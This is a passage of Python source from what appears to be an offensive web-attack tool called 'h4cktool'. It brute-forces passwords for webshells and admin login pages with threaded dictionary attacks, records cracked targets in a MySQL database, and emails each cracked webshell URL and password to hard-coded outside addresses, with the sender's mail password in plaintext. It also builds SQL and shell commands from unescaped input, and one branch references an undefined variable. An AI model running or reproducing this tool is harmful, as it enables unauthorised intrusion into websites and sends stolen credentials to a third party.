                         ' %s/%s %s\r' %
                         (try_time[0], sum[0], PASSWORD))
        sys.stdout.flush()

        if re.search(pattern, html) or len(html) - unlogin_length > 8000:
            get_flag[0] = 1
            end = time.time()
            print(Fore.RED + "congratulations!!! webshell cracked succeed!!!")
            string = "cracked webshell:%s password:%s" % (url, password)
            return_password[0] = password
            print(Fore.RED + string)
            print("you spend time:" + str(end - start[0]))
            http_domain_value = get_http_domain_from_url(url)
            # 经验证terminate()应该只能结束当前线程,不能达到结束所有线程
            return password

    def crack_allext_biaodan_webshell_url_inside_func(
            url, user_dict_file, pass_dict_file):
        urls = []
        passwords = []
        i = 0
        while 1:
            if os.path.exists(pass_dict_file) is False:
                print("please input your password dict:>", end=' ')
                pass_dict_file = input()
                if os.path.exists(pass_dict_file) is True:
                    break
            else:
                break
        f = open(pass_dict_file, "r+")
        for each in f:
            urls.append(url)
            each = re.sub(r"(\s)$", "", each)
            passwords.append(each)
            i += 1
        f.close()
        sum[0] = i
        start[0] = time.time()

        # 这里如果用的map将一直等到所有字典尝试完毕才退出,map是阻塞式,map_async是非阻塞式,用了map_async后要在成\
        # 功爆破密码的线程中关闭线程池,不让其他将要运行的线程运行,这样就不会出现已经爆破成功还在阻塞的情况了,可\
        # 参考下面文章
        # 后来试验似乎上面这句话可能是错的,要参照notes中的相关说明
        # http://blog.rockyqi.net/python-threading-and-multiprocessing.html
        pool = ThreadPool(20)
        # 奇怪的是这里的map可用成map_async,而一句话的爆破函数要用map,不能用map_async
        results_list = pool.map_async(
            allext_biaodan_webshell_crack_thread, list(zip(passwords, urls)))
        pool.close()
        pool.join()

    # 这里要注意的是Fore等模块的导入要在需要时才导入,它与tab_complete_for_file_path函数冲突
    # 且导入的下面的语句也不能放到crack_webshell函数那里,那样ThreadPool.map()会无法知道Fore是个什么东西
    try:
        from colorama import init, Fore
        init(autoreset=True)
    except:
        os.system("pip install colorama")
        from colorama import init, Fore
        init(autoreset=True)

    user_dict_file = "dicts/user.txt"
    pass_dict_file = "dicts/webshell_passwords.txt"
    user_form_name = get_user_and_pass_form_from_url(url)['user_form_name']
    pass_form_name = get_user_and_pass_form_from_url(url)['pass_form_name']
    # 这里如果字典中的返回键值对中的一个键对应的值为""(空字符串),那么返回的结果是"None"(一个叫做None的字符串)
    # print type(user_form_name)
    response_key_value = get_user_and_pass_form_from_url(url)[
        'response_key_value']
    unlogin_length = len(response_key_value['content'])

    get_flag = [0]
    try_time = [0]
    sum = [0]
    start = [0]
    current_password = [""]
    return_password = [""]

    if user_form_name is not None:
        while 1:
            if os.path.exists(user_dict_file) is False:
                print("please input your username dict:>", end=' ')
                user_dict_file = input()
                if os.path.exists(user_dict_file) is True:
                    break
            else:
                break

        crack_admin_login_url(url)

    else:
        if pass_form_name is not None:
            crack_allext_biaodan_webshell_url_inside_func(
                url, user_dict_file, pass_dict_file)

    return {'cracked': get_flag[0], 'password': return_password[0]}


def crack_webshell(url, anyway=0):
    # webshll爆破,第二个参数默认为0,如果设置不为0,则不考虑判断是否是webshll,如果设置为1,直接按direct_bao方式爆破
    # 如果设置为2,直接按biaodan_bao方式爆破

    figlet2file("cracking webshell", 0, True)
    print("cracking webshell --> %s" % url)
    print("正在使用吃奶的劲爆破...")

    ext = get_webshell_suffix_type(url)
    tmp = check_webshell_url(url)
    url_http_domain = get_http_domain_from_url(url)
    table_name_list = get_target_table_name_list(url_http_domain)
    urls_table_name = url_http_domain.split(
        "/")[-1].replace(".", "_") + "_urls"
    if tmp['y2'] == 'direct_bao' or tmp['y2'] == 'biaodan_bao':
        # 如果检测到可能是webshell,将数据库中like_webshell_url字段标记为1,并将url加入到相应表中的
        # like_webshell_urls字段中
        # 这里还没开始爆webshell,只是检测是否为可疑webshell
        for each_table in table_name_list:
            auto_write_string_to_sql(
                url,
                eval(get_key_value_from_config_file('config.ini','default','db_name')),
                each_table,
                "like_webshell_urls",
                'http_domain',
                url_http_domain)
        execute_sql_in_db(
            "update %s set like_webshell_url='1' where url='%s'" %
            (urls_table_name, url), eval(get_key_value_from_config_file('config.ini','default','db_name')))

    if anyway == 1 or tmp['y2'] == "direct_bao":
        return_value = crack_ext_direct_webshell_url(
            url, "dicts/webshell_passwords.txt", ext)
        if return_value['cracked'] == 0:
            print("webshell爆破失败 :(")
            return
        else:
            # 爆破成功将cracked_webshell_url_info标记为webshell密码信息,并将webshell密码信息加入到相应非urls表
            # 中的cracked_webshell_urls_info字段中
            strings_to_write = "webshell:%s,password:%s" % (
                url, return_value['password'])
            execute_sql_in_db(
                "update %s set cracked_webshell_url_info='%s' where url='%s'" %
                (urls_table_name, strings_to_write, url), eval(get_key_value_from_config_file('config.ini','default','db_name')))
            for each_table in table_name_list:
                auto_write_string_to_sql(
                    strings_to_write,
                    eval(get_key_value_from_config_file('config.ini','default','db_name')),
                    each_table,
                    "cracked_webshell_urls_info",
                    'http_domain',
                    url_http_domain)
            mail_msg_to(
                strings_to_write,
                "2784046065@qq.com",
                "cracked webshell url",
                "18137062539@163.com",
                "063913ok")
    elif anyway == 2 or tmp['y2'] == "biaodan_bao":
        return_value = crack_allext_biaodan_webshell_url(
            url, "dicts/user.txt", "dicts/webshell_passwords.txt")
        if return_value['cracked'] == 0:
            print("webshell爆破失败 :(")
            return
        else:
            # 爆破成功将cracked_webshell_url_info标记为webshell密码信息,并将webshell密码信息加入到相应表中的
            # cracked_webshell_urls_info字段中
            strings_to_write = "webshell:%s,password:%s" % (
                url, return_value['password'])
            execute_sql_in_db(
                "update %s set cracked_webshell_url_info='%s' where url='%s'" %
                (urls_table_name, strings_to_write, url), eval(get_key_value_from_config_file('config.ini','default','db_name')))
            for each_table in table_name_list:
                auto_write_string_to_sql(
                    strings_to_write,
                    eval(get_key_value_from_config_file('config.ini','default','db_name')),
                    each_table,
                    "cracked_webshell_urls_info",
                    'http_domain',
                    url_http_domain)
            mail_msg_to(
                strings_to_write,
                "2784046065@qq.com",
                "cracked webshell url",
                "18137062539@163.com",
                "063913ok")

    elif tmp['y2'] == "bypass":
        print(
            Fore.RED +
            "congratulations!!! webshell may found and has no password!!!")
        string = "cracked webshell:%s no password!!!" % url
        print(Fore.RED + string)

        # 爆破成功将cracked_webshell_url_info标记为webshell密码信息,并将webshell密码信息加入到相应表中的
        # cracked_webshell_urls_info字段中
        strings_to_write = "webshell:%s,password:%s" % (
            url, return_value['password'])
        execute_sql_in_db(
            "update %s set cracked_webshell_url_info='%s' where url='%s'" %
            (urls_table_name, strings_to_write, url), eval(get_key_value_from_config_file('config.ini','default','db_name')))
        for each_table in table_name_list:
            auto_write_string_to_sql(
                strings_to_write,
                eval(get_key_value_from_config_file('config.ini','default','db_name')),
                each_table,
                "cracked_webshell_urls_info",
                'http_domain',
                url_http_domain)
        mail_msg_to(strings_to_write, "2784046065@qq.com",
                    "cracked webshell url", "18137062539@163.com", "063913ok")

        return

    else:
        print("这不是一个webshell :(")
        return


def exist_database(db_name):
    # 检测db_name名字的数据库是否存在
    # 存在返回True,否则返回False
    result = execute_sql_in_db("show databases")
    if len(result) > 0:
        for each in result:
            if len(each) > 0 and each[0] == db_name:
                return True
    return False


def exist_table_in_db(table_name, db_name):
    # 检测数据库中存在表,存在返回True,否则返回False
    result = execute_sql_in_db("show tables", db_name)
    if len(result) > 0:
        for each in result:
            if len(each) > 0 and each[0] == table_name:
                return True
    return False


def database_init():
    # 本地数据库初始化,完成数据库配置和建立数据(数据库和targets+first_targets表),以及目标导入
    # 完成这一步后需要从数据库中按优先级取出没有完成的任务
    # eg.一个目标为http://www.freebuf.com,将它加入到targets表中,targets表中的sqli_scaned等各项标记扫描完成列代
    # 表该目标及其所有旁站对应项的扫描全部完成,在www_freebuf_com_pang表中也有http_domain为
    # http://www.freebuf.com的记录,该表中对应的sqli_scaned等各项标记代表目标
    # http://www.freebuf.com这一个网站的扫描完成情况

    print("database init process,database and tables will be created here...")
    if os.path.exists("config.py"):
        f = open("config.py", "r")
        all = f.readlines()
        f.close()
        config_file_abs_path = os.getcwd() + "/config.py"

        find_db_server = get_key_value_from_file(
            "db_server", '', config_file_abs_path)
        if find_db_server:
            db_server = find_db_server
        else:
            print("can not find db_server")
            while 1:
                print("please input your database server addr:>", end=' ')
                db_server = get_input_intime("127.0.0.1", 10)
                if check_string_is_ip(db_server) is True:
                    os.system(
                        '''echo db_server='"'%s'"' >> %s''' %
                        (db_server, config_file_abs_path))
                    break
                else:
                    print("your input may not be a regular ip addr:(")
                    continue
        print("db_server:" + db_server)

        find_db_user = get_key_value_from_file(
            "db_user", '', config_file_abs_path)
        if find_db_user:
            db_user = find_db_user
        else:
            print("can not find db_user")
            print("please input your database username:>", end=' ')
            db_user = get_input_intime("root", 10)
            os.system(
                '''echo db_user='"'%s'"' >> %s''' %
                (db_user, config_file_abs_path))
        print("db_user:" + db_user)

        find_db_pass = get_key_value_from_file(
            "db_pass", '', config_file_abs_path)
        if find_db_pass:
            db_pass = find_db_pass
        else:
            print("can not find db_pass")
            print("please input your database password:>", end=' ')
            db_pass = get_input_intime("root", 10)
            os.system(
                '''echo db_pass='"'%s'"' >> %s''' %
                (db_pass, config_file_abs_path))
        print("db_pass:" + db_pass)

        find_db_name = get_key_value_from_file(
            "db_name", '', config_file_abs_path)
        if find_db_name:
            db_name = find_db_name
        else:
            print("can not find db_name")
            print(
                "please input your database name you want to create,this database include two tables,and \
will store all the scan info,if you don't understand,input y|Y and system will use the \
default 'h4cktool' as database name,if you want to make your own database name,input n|N \
default[y]:>", end=' ')
            choose = get_input_intime('y', 5)
            if choose != 'n' and choose != 'N':
                db_name = "h4cktool"
            else:
                print(
                    "please input your database name you want to create:>",
                    end=' ')
                db_name = input()
            os.system(
                '''echo db_name='"'%s'"' >> %s''' %
                (db_name, config_file_abs_path))
        print("db_name:" + db_name)

        # 普通目标表
        find_targets_table_name = get_key_value_from_file(
            "targets_table_name", '', config_file_abs_path)
        if find_targets_table_name:
            targets_table_name = find_targets_table_name
        else:
            print("can not find targets_table_name")
            print(
                "please inpout your table name for storing all targets and their info(if you don't \
understand ,use the default one:'targets'),input y|Y for default 'targets' as all targets'\
table name,n|N to input your own table name as targets' table name. default[y]:>", end=' ')
            choose = get_input_intime('y', 5)
            if choose != 'n' and choose != 'N':
                targets_table_name = "targets"
            else:
                print(
                    "please input your table name for storing all targets and their info:>",
                    end=' ')
                targets_table_name = input()
            os.system('''echo targets_table_name='"'%s'"' >> %s''' %
                      (targets_table_name, config_file_abs_path))
        print("targets_table_name:" + targets_table_name)

        # 优先级更高的目标表
        find_first_targets_table_name = get_key_value_from_file(
            "first_targets_table_name", '', config_file_abs_path)
        if find_first_targets_table_name:
            first_targets_table_name = find_first_targets_table_name
        else:
            print("can not find first_targets_table_name")
            print(
                "please inpout your table name for storing all special targets with higher priority and \
their info(if you don't understand,use the default one:'first_targets'),input y|Y for \
default 'first_targets' as all high priority targets' table name,n|N to input your own \
table name as all high priority targets' table name. default[y]:>", end=' ')
            choose = get_input_intime('y')
            if choose != 'n' and choose != 'N':
                first_targets_table_name = "first_targets"
            else:
                print(
                    "please input your table name for storing all special targets with higher priority \
and their info:>", end=' ')
                first_targets_table_name = input()
            os.system('''echo first_targets_table_name='"'%s'"' >> %s''' %
                      (first_targets_table_name, config_file_abs_path))
        print("first_targets_table_name:" + first_targets_table_name)

    else:
        # config.py文件不存在
        try:
            os.system("touch config.py")
            config_file_abs_path = os.getcwd() + "/config.py"
            while 1:
                print("please input your database server addr:>", end=' ')
                db_server = get_input_intime("127.0.0.1", 20)
                if check_string_is_ip(db_server) is True:
                    os.system(
                        '''echo db_server='"'%s'"' >> config.py''' %
                        db_server)
                    break
                else:
                    print("your input may not be a regular ip addr:(")
                    continue
            print("db_server:" + db_server)

            print("please input your database username:>", end=' ')
            db_user = get_input_intime("root", 20)
            os.system(
                '''echo db_user='"'%s'"' >> %s''' %
                (db_user, config_file_abs_path))
            print("db_user:" + db_user)

            print("please input your database password:>", end=' ')
            db_pass = get_input_intime("root", 20)
            os.system(
                '''echo db_pass='"'%s'"' >> %s''' %
                (db_pass, config_file_abs_path))
            print("db_pass:" + db_pass)

            print(
                "please input your database name you want to create,this database include two tables,and \
will store all the scan info,if you don't understand,input y|Y and system will use the \
default 'h4cktool' as database name,if you want to make your own database name,input n|N \
default[y]:>", end=' ')
            choose = get_input_intime('y', 5)
            if choose != 'n' and choose != 'N':
                db_name = "h4cktool"
            else:
                print(
                    "please input your database name you want to create:>",
                    end=' ')
                db_name = input()
            os.system(
                '''echo db_name='"'%s'"' >> %s''' %
                (db_name, config_file_abs_path))
            print("db_name:" + db_name)

            print(
                "please inpout your table name for storing all targets and their info(if you don't \
understand,use the default one:'targets'),input y|Y for default 'targets' as all targets' \
table name,n|N to input your own table name as targets' table name. default[y]:>", end=' ')
            choose = get_input_intime('y', 5)
            if choose != 'n' and choose != 'N':
                targets_table_name = "targets"
            else:
                print(
                    "please input your table name for storing all targets and their info:>",
                    end=' ')
                targets_table_name = input()
            os.system('''echo targets_table_name='"'%s'"' >> %s''' %
                      (targets_table_name, config_file_abs_path))
            print("targets_table_name:" + targets_table_name)

            print(
                "please inpout your table name for storing all special targets with higher priority and \
their info(if you don't understand,use the default one:'first_targets'),input y|Y for \
default 'first_targets' as all high priority targets' table name,n|N to input your own \
table name as all high priority targets' table name. default[y]:>", end=' ')
            choose = get_input_intime('y')
            if choose != 'n' and choose != 'N':
                first_targets_table_name = "first_targets"
            else:
                print(
                    "please input your table name for storing all special targets with higher priority and \
their info:>", end=' ')
                first_targets_table_name = input()
            os.system('''echo first_targets_table_name='"'%s'"' >> %s''' %
                      (first_targets_table_name, config_file_abs_path))
            print("first_targets_table_name:" + first_targets_table_name)

        except:
            print("create database config file error")

    # 创建数据库db_name和表targets_table_name,first_targets_table_name,domain_pang
    sql0 = "create database %s" % db_name
    if exist_database(eval(get_key_value_from_config_file('config.ini','default','db_name'))) == False:
        execute_sql_in_db(sql0)
    else:
        print("database exists,I will use the former database store tables")
    # 数据库中统一都用字符串形式存储各种数据
    # targets和first_targets表存放扫描是否完成信息和旁站列表和总的扫描结果
    # 这里的crawl_finished代表所有主要目标一个domain完成了爬虫
    sql1 = "create table %s(http_domain  varchar(100) not null primary key,domain varchar(50) not null,\
risk_scan_info mediumtext not null,\
risk_scaned varchar(50) not null default 0,\
urls mediumtext not null,\
script_type varchar(50) not null,\
script_type_scaned varchar(50) not null default 0,\
dirb_info mediumtext not null,dirb_scaned varchar(50) not null default 0,\
sqlis text not null,sqli_scaned varchar(50) not null default 0,\
robots_and_sitemap text not null,scan_result mediumtext not null,\
crawl_scaned varchar(50) not null default 0,\
cms_value text not null,cms_identify_scaned varchar(50) not null default 0,cms_scan_info text not null,cms_scaned varchar(50) not null default 0,\
like_admin_login_urls text not null,\
cracked_admin_login_urls_info text not null,like_webshell_urls text not null,\
cracked_webshell_urls_info text not null,\
crack_webshell_scaned varchar(50) not null default 0,\
crack_admin_page_scaned varchar(50) not null default 0,\
whois_info text not null,resource_files text not null,\
scan_finished varchar(50) not null default 0,\
pang_domains text not null,\
sub_domains text not null,\
get_pang_domains_finished varchar(50) not null default 0,\
get_sub_domains_finished varchar(50) not null default 0,\
pang_domains_crawl_scaned varchar(50) not null default 0,\
sub_domains_crawl_scaned varchar(50) not null default 0,\
pang_domains_risk_scaned varchar(50) not null default 0,\
sub_domains_risk_scaned varchar(50) not null default 0,\
pang_domains_script_type_scaned varchar(50) not null default 0,\
sub_domains_script_type_scaned varchar(50) not null default 0,\
pang_domains_dirb_scaned varchar(50) not null default 0,\
sub_domains_dirb_scaned varchar(50) not null default 0,\
pang_domains_sqli_scaned varchar(50) not null default 0,\
sub_domains_sqli_scaned varchar(50) not null default 0,\
pang_domains_cms_identify_scaned varchar(50) not null default 0,\
pang_domains_cms_scaned varchar(50) not null default 0,\
sub_domains_cms_identify_scaned varchar(50) not null default 0,\
sub_domains_cms_scaned varchar(50) not null default 0,\
pang_domains_crack_webshell_scaned varchar(50) not null default 0,\
sub_domains_crack_webshell_scaned varchar(50) not null default 0,\
pang_domains_crack_admin_page_scaned varchar(50) not null default 0,\
sub_domains_crack_admin_page_scaned varchar(50) not null default 0,\
pang_domains_whois_scaned varchar(50) not null default 0,\
sub_domains_whois_scaned varchar(50) not null default 0,\
pang_domains_scan_finished varchar(50) not null default 0,\
sub_domains_scan_finished varchar(50) not null default 0,\
final_scan_result mediumtext not null)" % targets_table_name

    sql2 = "create table %s(http_domain  varchar(100) not null primary key,domain varchar(50) not null,\
risk_scan_info mediumtext not null,\
risk_scaned varchar(50) not null default 0,\
urls mediumtext not null,\
script_type varchar(50) not null,\
script_type_scaned varchar(50) not null default 0,\
dirb_info mediumtext not null,dirb_scaned varchar(50) not null default 0,\
sqlis text not null,sqli_scaned varchar(50) not null default 0,\
robots_and_sitemap text not null,scan_result mediumtext not null,\
crawl_scaned varchar(50) not null default 0,\
cms_value text not null,cms_identify_scaned varchar(50) not null default 0,cms_scan_info text not null,cms_scaned varchar(50) not null default 0,\
like_admin_login_urls text not null,\
cracked_admin_login_urls_info text not null,like_webshell_urls text not null,\
cracked_webshell_urls_info text not null,\
crack_webshell_scaned varchar(50) not null default 0,\
crack_admin_page_scaned varchar(50) not null default 0,\
whois_info text not null,resource_files text not null,\
scan_finished varchar(50) not null default 0,\
pang_domains text not null,\
sub_domains text not null,\
get_pang_domains_finished varchar(50) not null default 0,\
get_sub_domains_finished varchar(50) not null default 0,\
pang_domains_crawl_scaned varchar(50) not null default 0,\
sub_domains_crawl_scaned varchar(50) not null default 0,\
pang_domains_risk_scaned varchar(50) not null default 0,\
sub_domains_risk_scaned varchar(50) not null default 0,\
pang_domains_script_type_scaned varchar(50) not null default 0,\
sub_domains_script_type_scaned varchar(50) not null default 0,\
pang_domains_dirb_scaned varchar(50) not null default 0,\
sub_domains_dirb_scaned varchar(50) not null default 0,\
pang_domains_sqli_scaned varchar(50) not null default 0,\
sub_domains_sqli_scaned varchar(50) not null default 0,\
pang_domains_cms_identify_scaned varchar(50) not null default 0,\
pang_domains_cms_scaned varchar(50) not null default 0,\
sub_domains_cms_identify_scaned varchar(50) not null default 0,\
sub_domains_cms_scaned varchar(50) not null default 0,\
pang_domains_crack_webshell_scaned varchar(50) not null default 0,\
sub_domains_crack_webshell_scaned varchar(50) not null default 0,\
pang_domains_crack_admin_page_scaned varchar(50) not null default 0,\
sub_domains_crack_admin_page_scaned varchar(50) not null default 0,\
pang_domains_whois_scaned varchar(50) not null default 0,\
sub_domains_whois_scaned varchar(50) not null default 0,\
pang_domains_scan_finished varchar(50) not null default 0,\
sub_domains_scan_finished varchar(50) not null default 0,\
final_scan_result mediumtext not null)" % first_targets_table_name

    # print sql1
    if exist_table_in_db(targets_table_name, eval(get_key_value_from_config_file('config.ini','default','db_name'))) == False:
        execute_sql_in_db(sql1, eval(get_key_value_from_config_file('config.ini','default','db_name')))
    else:
        print("targets_table_name exists,I will use the former one to store info")
    if exist_table_in_db(first_targets_table_name, eval(get_key_value_from_config_file('config.ini','default','db_name'))) == False:
        execute_sql_in_db(sql2, eval(get_key_value_from_config_file('config.ini','default','db_name')))
    else:
        print("first_targets_table_name exists,I will use the former one to store info")

    # 目标导入并根据选择的扫描模式创建目标旁站表或子站表
    print("input your targets now...")
    print("input 'a|A' for adding your targets one by one\n\
input 'f|F' for adding your target by loading a target file\n\
input 'n|N' for adding no targets and use the exists targets in former db")
    choose = get_input_intime('n', 5)

    if choose == 'f' or choose == 'F':
        targets_file_abs_path = get_input_intime("targets.txt", 20)
        print('\n')
        with open(targets_file_abs_path, "r+") as f:
            for target in f:
                target = re.sub(r"(\s)$", "", target)
                # 创建目标旁站表,比目标表少了pang_domains字段和sub_domains字段
                pang_table_name = target.split(
                    '/')[-1].replace(".", "_") + "_pang"
                # 创建目标子站表,比目标表少了pang_domains字段和sub_domains字段
                sub_table_name = target.split(
                    '/')[-1].replace(".", "_") + "_sub"
                # 这里的crawl_scaned代表一个站(pang or sub)完成了爬虫

                sql_pang = "create table %s(http_domain  varchar(100) not null primary key,domain varchar(50) not null,\
risk_scan_info mediumtext not null,\
risk_scaned varchar(50) not null default 0,\
urls mediumtext not null,\
script_type varchar(50) not null,\
script_type_scaned varchar(50) not null default 0,\
dirb_info mediumtext not null,dirb_scaned varchar(50) not null default 0,\
sqlis text not null, sqli_scaned varchar(50) not null default 0,\
crawl_scaned varchar(50) not null default 0,\
cms_value text not null,cms_identify_scaned varchar(50) not null default 0,cms_scan_info text not null,cms_scaned varchar(50) not null default 0,\
like_admin_login_urls text not null, \
cracked_admin_login_urls_info text not null, like_webshell_urls text not null,\
cracked_webshell_urls_info text not null,\
crack_webshell_scaned varchar(50) not null default 0,\
crack_admin_page_scaned varchar(50) not null default 0,\
whois_info text not null, resource_files text not null,\
robots_and_sitemap text not null, scan_result mediumtext not null,\
scan_finished varchar(50) not null default 0)" % pang_table_name

                sql_sub = "create table %s(http_domain  varchar(100) not null primary key,domain varchar(50) not null,\
risk_scan_info mediumtext not null,\
risk_scaned varchar(50) not null default 0,\
urls mediumtext not null,\
script_type varchar(50) not null,\
script_type_scaned varchar(50) not null default 0,\
dirb_info mediumtext not null,dirb_scaned varchar(50) not null default 0,\
sqlis text not null, sqli_scaned varchar(50) not null default 0,\
crawl_scaned varchar(50) not null default 0,\
cms_value text not null,cms_identify_scaned varchar(50) not null default 0,cms_scan_info text not null,cms_scaned varchar(50) not null default 0,\
like_admin_login_urls text not null, \
cracked_admin_login_urls_info text not null, like_webshell_urls text not null,\
cracked_webshell_urls_info text not null,\
crack_webshell_scaned varchar(50) not null default 0,\
crack_admin_page_scaned varchar(50) not null default 0,\
whois_info text not null, resource_files text not null,\
robots_and_sitemap text not null, scan_result mediumtext not null,\
scan_finished varchar(50) not null default 0)" % sub_table_name

                # 这里改成无论何种扫描方式都建立sub表,因为爬虫模块会爬到子站,将爬到的子站放到sub表中对应字段中
                # 这里改成无论何种扫描方式都建立pang表,因为后面可能有对pang表的访问
                if eval(get_key_value_from_config_file('config.ini','default','scan_way')) in [1, 2, 3, 4]:
                    execute_sql_in_db(sql_pang, eval(get_key_value_from_config_file('config.ini','default','db_name')))
                    execute_sql_in_db(sql_sub, eval(get_key_value_from_config_file('config.ini','default','db_name')))
                else:
                    print("scan_way setup error,not in 1-4")

                # 创建目标urls表.eg:www_baidu_com_urls
                target_urls_table_name = target.split(
                    '/')[-1].replace(".", "_") + "_urls"
                sql = "create table %s(url varchar(250) not null primary key,code varchar(50) not null,\
title varchar(200) not null,content mediumtext not null,has_sqli varchar(50) not null,\
is_upload_url varchar(50) not null,\
like_webshell_url varchar(50) not null default 0,\
cracked_webshell_url_info varchar(50) not null,\
like_admin_login_url varchar(50) not null,\
cracked_admin_login_url_info varchar(50) not null,\
http_domain varchar(70) not null)" % target_urls_table_name
                execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))

        os.system(
            '''echo targets_file='"'%s'"' >> targets.py''' %
            targets_file_abs_path)
        print(
            "do you want to add it to the first targets table with higher priority to scan? y|n \
default[n]")
        choose = get_input_intime('n', 5)
        if choose == 'y' or choose == 'Y':
            with open(targets_file_abs_path, "r+") as f:
                for target in f:
                    target = re.sub(r"(\s)$", "", target)
                    sql3 = "insert into %s(http_domain,domain) values('%s','%s') " % (
                        first_targets_table_name, target, target.split("/")[-1])
                    execute_sql_in_db(sql3, eval(get_key_value_from_config_file('config.ini','default','db_name')))
        else:
            with open(targets_file_abs_path, "r+") as f:
                for target in f:
                    target = re.sub(r"(\s)$", "", target)
                    sql4 = "insert into %s(http_domain,domain) values('%s','%s')" % (
                        targets_table_name, target, target.split('/')[-1])
                    execute_sql_in_db(sql4, eval(get_key_value_from_config_file('config.ini','default','db_name')))

    elif choose == 'a' or choose == 'A':
        print(
            "please input your targets,eg.https://www.baidu.com,'d|D' for done,default[d]")
        while 1:
            print(
                "please input your targets,eg.https://www.baidu.com,'d|D' for done,default[d]")
            target = get_input_intime('d', 20)
            if target != 'd' and target != 'D' and re.match(
                    r"http.*", target):
                print(
                    "do you want to add it to the first targets table with higher priority to scan? y|n \
default[n]")
                target = get_http_domain_from_url(target)
                choose = get_input_intime('n', 5)

                # 创建目标旁站表,比目标表少了pang_domains字段和sub_domains字段
                pang_table_name = target.split(
                    '/')[-1].replace(".", "_") + "_pang"
                # 创建目标子站表,比目标表少了pang_domains字段和sub_domains字段
                sub_table_name = target.split(
                    '/')[-1].replace(".", "_") + "_sub"
                # 这里的crawl_scaned代表一个站(pang or sub)完成了爬虫
                sql_pang = "create table %s(http_domain  varchar(100) not null primary key,domain varchar(50) not null,\
risk_scan_info mediumtext not null,\
risk_scaned varchar(50) not null default 0,\
urls mediumtext not null,\
script_type varchar(50) not null,\
script_type_scaned varchar(50) not null default 0,\
dirb_info mediumtext not null,dirb_scaned varchar(50) not null default 0,\
sqlis text not null,sqli_scaned varchar(50) not null default 0,\
crawl_scaned varchar(50) not null default 0,\
cms_value text not null,cms_identify_scaned varchar(50) not null default 0,cms_scan_info text not null,cms_scaned varchar(50) not null default 0,\
like_admin_login_urls text not null,\
cracked_admin_login_urls_info text not null,like_webshell_urls text not null,\
cracked_webshell_urls_info text not null,\
crack_webshell_scaned varchar(50) not null default 0,\
crack_admin_page_scaned varchar(50) not null default 0,\
whois_info text not null,resource_files text not null,\
robots_and_sitemap text not null,scan_result mediumtext not null,\
scan_finished varchar(50) not null default 0)" % pang_table_name

                sql_sub = "create table %s(http_domain  varchar(100) not null primary key,domain varchar(50) not null,\
risk_scan_info mediumtext not null,\
risk_scaned varchar(50) not null default 0,\
urls mediumtext not null,\
script_type varchar(50) not null,\
script_type_scaned varchar(50) not null default 0,\
dirb_info mediumtext not null,dirb_scaned varchar(50) not null default 0,\
sqlis text not null, sqli_scaned varchar(50) not null default 0,\
crawl_scaned varchar(50) not null default 0,\
cms_value text not null,cms_identify_scaned varchar(50) not null default 0,cms_scan_info text not null,cms_scaned varchar(50) not null default 0,\
like_admin_login_urls text not null, \
cracked_admin_login_urls_info text not null, like_webshell_urls text not null,\
cracked_webshell_urls_info text not null,\
crack_webshell_scaned varchar(50) not null default 0,\
crack_admin_page_scaned varchar(50) not null default 0,\
whois_info text not null, resource_files text not null,\
robots_and_sitemap text not null, scan_result mediumtext not null,\
scan_finished varchar(50) not null default 0)" % sub_table_name

                # 这里改成无论何种扫描方式都建立sub表,因为爬虫模块会爬到子站,将爬到的子站放到sub表中对应字段中
                # 这里改成无论何种扫描方式都建立pang表,因为后面可能有对pang表的访问
                if eval(get_key_value_from_config_file('config.ini','default','scan_way')) in [1, 2, 3, 4]:
                    execute_sql_in_db(sql_pang, eval(get_key_value_from_config_file('config.ini','default','db_name')))
                    execute_sql_in_db(sql_sub, eval(get_key_value_from_config_file('config.ini','default','db_name')))
                else:
                    print("scan_way setup error,not in 1-4")

                # 创建目标urls表.eg:www_baidu_com_urls
                target_urls_table_name = target.split(
                    '/')[-1].replace(".", "_") + "_urls"
                sql = "create table %s(url varchar(250) not null primary key,code varchar(50) not null,\
title varchar(200) not null,content mediumtext not null,has_sqli varchar(50) not null,\
is_upload_url varchar(50) not null,\
like_webshell_url varchar(50) not null default 0,\
cracked_webshell_url_info varchar(50) not null,\
like_admin_login_url varchar(50) not null,\
cracked_admin_login_url_info varchar(50) not null,\
http_domain varchar(70) not null)" % target_urls_table_name
                execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))

                if choose == 'y' or choose == 'Y':
                    sql3 = "insert into %s(http_domain,domain) values('%s','%s') " % (
                        first_targets_table_name, target, target.split("/")[-1])
                    execute_sql_in_db(sql3, eval(get_key_value_from_config_file('config.ini','default','db_name')))

                else:
                    sql4 = "insert into %s(http_domain,domain) values('%s','%s')" % (
                        targets_table_name, target, target.split('/')[-1])
                    execute_sql_in_db(sql4, eval(get_key_value_from_config_file('config.ini','default','db_name')))

                continue
            elif target != 'd' and target != 'D' and re.match(r"http.*", target) is None:
                print("please input http(s)://... or d or D")
                continue
            else:
                break

    else:
        print("I will use the exisit targets in the db for scan job")
        pass


def get_value_from_url(url):
    # 返回一个字典{'y1':y1,'y2':y2}
    # eg.从http://www.baidu.com/12/2/3.php?a=1&b=2中得到
    #'y1':"http://www.baidu.com/12/2/3.php"
    #'y2':"http://www.baidu.com/12/2"
    import urllib.parse
    import re
    url = re.sub('(\\s)$', '', url)
    parsed = urllib.parse.urlparse(url)
    y1 = parsed.scheme + '://' + parsed.netloc + parsed.path
    y2_len = len(y1) - len(y1.split('/')[-1]) - 1
    y2 = y1[:y2_len]
    return {
        'y1': y1,
        'y2': y2}


def collect_urls_from_url(url):
    # 从url所在的html内容中收集url到url队列
    # 返回值是一个字典,{'y1':y1,'y2':y2}
    # y1是根据参数url得到的html页面中的所有url,是个列表类型
    # y2是参数url对应的三个关键元素,y2是个字典类型,eg.{"code":200,"title":None,"content":""}
    # 包括收集没有http_domain前缀的uri,src属性中的uri等
    # 整理uri,暂时不做带参数的uri变成不带参数的页面
    # eg.http://www.baidu.com/nihao?a=1&b=2为http://www.baidu.com/nihao
    # 后期可将带参数的uri根据参数fuzz,用于爆路径,发现0day等
    all_uris = []
    return_all_urls = []
    result = get_request(url)
    content = result['content']
    bs = BeautifulSoup(content, 'lxml')
    if re.match(
        r"%s/*((robots\.txt)|(sitemap\.xml))" %
        get_http_domain_pattern_from_url(url),
            url):
        # print content
        if re.search(r"(robots\.txt)$", url):
            # 查找allow和disallow中的所有uri
            find_uri_pattern = re.compile(
                r"((Allow)|(Disallow)):[^\S\n]*(/[^?\*\n#]+)(/\?)?\s", re.I)
            find_uri = re.findall(find_uri_pattern, content)
            if find_uri:
                for each in find_uri:
                    all_uris.append(each[3])
